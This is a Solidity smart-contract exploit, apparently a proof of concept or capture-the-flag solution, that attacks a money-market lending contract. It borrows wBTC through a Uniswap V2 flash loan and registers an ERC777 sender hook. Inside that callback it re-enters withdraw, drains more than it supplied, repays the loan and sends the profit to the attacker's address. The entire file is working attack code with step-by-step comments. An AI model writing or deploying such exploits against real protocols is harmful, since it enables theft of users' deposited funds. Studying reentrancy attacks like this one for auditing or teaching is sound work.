// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IMoneyMarket {
    function supply(address asset, uint amount) external returns (uint);
    function withdraw(address asset, uint requestedAmount) external returns (uint);
}

contract MoneyMarketExploiter is IERC777Sender {

    IERC1820Registry constant registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");

    IUniswapV2Pair pair; // USDC-wBTC pair, for flashloan
    IMoneyMarket moneyMarket;

    IERC20 wbtc;
    address attacker;

    constructor(
        address _pair,
        address _moneyMarket,
        address _wbtc
    ) {
        pair = IUniswapV2Pair(_pair);
        moneyMarket = IMoneyMarket(_moneyMarket);
        wbtc = IERC20(_wbtc);
        attacker = msg.sender;
    }

    /// @dev Starts exploit
    function runExploit() external {
        pair.swap(0,1000e18,address(this),bytes('not empty'));
    }

    /// @dev Flashloan callback
    function uniswapV2Call(
        address _sender, 
        uint256 _amount0,
        uint256 _amount1, // wBTC
        bytes calldata _data
    ) external {
        require(msg.sender == address(pair),'caller');

        // first supply 999 wBTC
        wbtc.approve(address(moneyMarket),1000e18);
        moneyMarket.supply(address(wbtc),999e18);

        // set the ERC777 implementer for this address to be this address
        registry.setInterfaceImplementer(
            address(this), 
            _TOKENS_SENDER_INTERFACE_HASH, 
            address(this)
        );

        // supply 1 wBTC, which will trigger callback through _callTokensToSend
        moneyMarket.supply(address(wbtc),1e18);

        // withdraw final wBTC which is credited at end of earlier supply(..) call
        moneyMarket.withdraw(address(wbtc),1000e18);

        // repay the flashloan
        uint256 loanAmount = _amount1 * 1000 * 1e18 / 997 / 1e18 + 1;
        wbtc.transfer(address(pair),loanAmount);

        // transfer gains to attacker
        wbtc.transfer(attacker,wbtc.balanceOf(address(this)));
    }

    /// @dev _callTokensToSend callback
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        moneyMarket.withdraw(address(wbtc),999e18);
    }

}